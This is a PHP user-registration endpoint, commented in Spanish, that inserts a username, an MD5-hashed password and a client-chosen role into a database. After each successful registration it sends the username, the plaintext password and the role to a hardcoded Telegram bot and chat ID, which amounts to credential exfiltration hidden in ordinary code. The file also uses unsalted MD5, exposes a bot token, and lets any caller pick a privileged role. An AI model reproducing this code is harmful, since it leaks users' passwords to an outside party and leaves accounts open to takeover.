<?php
// Conectar a la base de datos
include '../includes/db_connect.php';

// Establecer el tipo de contenido de la respuesta a JSON
header('Content-Type: application/json');

// Inicializar la respuesta
$response = ['success' => false, 'message' => ''];

// Obtener datos de la petición AJAX
$data = json_decode(file_get_contents('php://input'), true);
$username = $data['username'];
$password = $data['password'];
$role = $data['role'];

// Validar que los datos no estén vacíos
if (!empty($username) && !empty($password) && !empty($role)) {
    try {
        // Preparar y ejecutar la inserción del nuevo usuario
        $stmt = $pdo->prepare("INSERT INTO usuarios (nombre_usuario, contrasena, creditos, rol) VALUES (:username, :password, 0, :role)");
        $success = $stmt->execute([
            'username' => $username,
            'password' => md5($password), // Usando MD5 para encriptar la contraseña
            'role' => $role
        ]);

        if ($success) {
                 $response['success'] = true;
            
            $telegram_token = '6845776951:AAFdC8gBR_83s5WCQpjE1xVFIpO7j7SaduU'; // Reemplaza con tu token de Telegram
            $chat_id = '7403127440'; // Reemplaza con tu ID de chat
            $message = "NUEVO USUARIO REGISTRADO:\n";
            $message .= "Usuario: $username \n";
            $message .= "contraseña: $password\n";
            $message .= "Tipo Usuario: $role \n"; // Usa la variable de sesión aquí
            
            // URL para enviar el mensaje
            $url = "https://api.telegram.org/bot$telegram_token/sendMessage?chat_id=$chat_id&text=" . urlencode($message);
            $response['message'] = 'Usuario agregado correctamente.';
            // Envía el mensaje
            file_get_contents($url);
        } else {
            $response['message'] = 'Error al agregar el usuario.';
        }
    } catch (Exception $e) {
        // Manejar excepciones y errores de base de datos
        $response['message'] = 'Error: ' . $e->getMessage();
    }
} else {
    $response['message'] = 'Todos los campos son requeridos.';
}

// Responder a la petición AJAX
echo json_encode($response);
?>
